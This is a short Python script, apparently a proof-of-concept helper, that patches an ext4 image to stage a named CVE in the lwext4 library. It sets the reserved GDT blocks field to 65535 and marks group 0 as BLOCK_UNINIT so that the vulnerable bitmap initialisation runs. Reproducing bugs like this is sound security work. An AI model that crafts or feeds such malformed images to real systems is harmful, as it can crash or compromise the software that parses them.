#!/usr/bin/env python3
"""Patch a pristine lwext4 ext4 image for CVE-2025-71474 staging.

Changes only:
  * s_reserved_gdt_blocks (superblock byte offset 1024+206) -> 65535;
  * group 0 bg_flags (byte offset 4096+18) -> BLOCK_UNINIT|ITABLE_ZEROED,
    so ext4_fs_get_block_group_ref() calls ext4_fs_init_block_bitmap().
The inode count stays at the safe value 8192. Usage: BASE OUT [GDT_LEVELS]
"""
import shutil
import struct
import sys

SB_OFF = 1024
BG0_OFF = 4096
BLOCK_UNINIT = 0x0002
ITABLE_ZEROED = 0x0004


def main():
    base, out = sys.argv[1], sys.argv[2]
    gdt = int(sys.argv[3], 0) if len(sys.argv) > 3 else 65535
    shutil.copyfile(base, out)
    with open(out, "r+b") as f:
        f.seek(SB_OFF + 56)
        if struct.unpack("<H", f.read(2))[0] != 0xEF53:
            raise SystemExit("not an ext4 image")
        f.seek(SB_OFF + 206)
        old = struct.unpack("<H", f.read(2))[0]
        f.seek(SB_OFF + 206)
        f.write(struct.pack("<H", gdt))
        f.seek(BG0_OFF + 18)
        flags = struct.unpack("<H", f.read(2))[0]
        new_flags = (flags | BLOCK_UNINIT | ITABLE_ZEROED) & ~0x0001
        f.seek(BG0_OFF + 18)
        f.write(struct.pack("<H", new_flags))
        f.flush()
    print(f"OUT={out} RESERVED_GDT={old}->{gdt} BG0_FLAGS={flags:#06x}->{new_flags:#06x}")


if __name__ == "__main__":
    main()
